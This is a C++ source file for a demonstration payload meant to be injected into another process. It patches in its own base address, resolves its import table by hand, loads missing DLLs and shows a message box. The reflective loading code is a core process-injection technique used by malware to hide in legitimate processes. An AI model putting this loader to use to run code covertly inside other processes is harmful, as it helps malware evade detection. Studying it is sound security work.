/*==================================================================================
Example Payload to be injected into target process by injector.

Upon injection, value of imgVA will be replaced and contain base address
of payload. Payload fixes its own import table and loads any missing DLL's.
===================================================================================*/

#include <iostream>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib,"user32.lib")

/*==============================================================
                       Function Prototypes
================================================================*/
int FixImportTables(PIMAGE_NT_HEADERS &imgNtHeaders, PVOID &buff);
int FixImportTables( PVOID imgVA);


/*==============================================================
                       Function Declarations
================================================================*/
int main()
{
    static DWORD imgVA = 0xDEADBEEF; /*this value will be replaced with 
										payload base address upon injection into
										target process.*/
	printf("imgVA %x\n", imgVA);
    FixImportTables((PVOID)imgVA);
    printf("I am a PE running in injected memory!\n");
    MessageBox(NULL,"I am a PE running in injected memory and my import table is fixed!","wow",MB_OK);
    return 0;
}

//Finds DOS and optional headers from imgVA and calls FixImportTables
int FixImportTables( PVOID imgVA)
{
    IMAGE_DOS_HEADER* imgDOS = (IMAGE_DOS_HEADER*)imgVA;
    IMAGE_NT_HEADERS* imgNtHeaders = (IMAGE_NT_HEADERS*)((long) imgDOS + imgDOS->e_lfanew);
    return FixImportTables(imgNtHeaders, imgVA);
}

//fix import table and load dlls
int FixImportTables(PIMAGE_NT_HEADERS &imgNtHeaders, PVOID &buff)
{
    IMAGE_DATA_DIRECTORY ddImportTable = imgNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	IMAGE_IMPORT_DESCRIPTOR* importDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)(DWORD(buff) + ddImportTable.VirtualAddress);
	
	while (importDescriptor->Name != NULL) //loop through dll import tables
	{
		DWORD dllName = DWORD(buff) + importDescriptor->Name;

		//Get handle to dll
		HMODULE hmDll = GetModuleHandle((LPCSTR)dllName);
		if(hmDll == NULL) //If dll is not loaded, load it.
		{
			hmDll = LoadLibrary((LPCSTR)dllName);
		}

		DWORD* IAT = (DWORD*)(DWORD(buff) + importDescriptor->FirstThunk); //import address table
		DWORD* INT = (DWORD*)(DWORD(buff) + importDescriptor->OriginalFirstThunk); //import name table

		//map each function address to IAT.
		while (*(DWORD*)INT)
		{
			PIMAGE_IMPORT_BY_NAME ibn = PIMAGE_IMPORT_BY_NAME(DWORD(buff) + *(DWORD*)INT);
			DWORD adr = (DWORD)GetProcAddress(hmDll, (LPCSTR)ibn->Name);
			*IAT = adr;
			IAT++;
			INT++;
		}

		importDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD)(importDescriptor) + sizeof(IMAGE_IMPORT_DESCRIPTOR));
	}

	return true;
}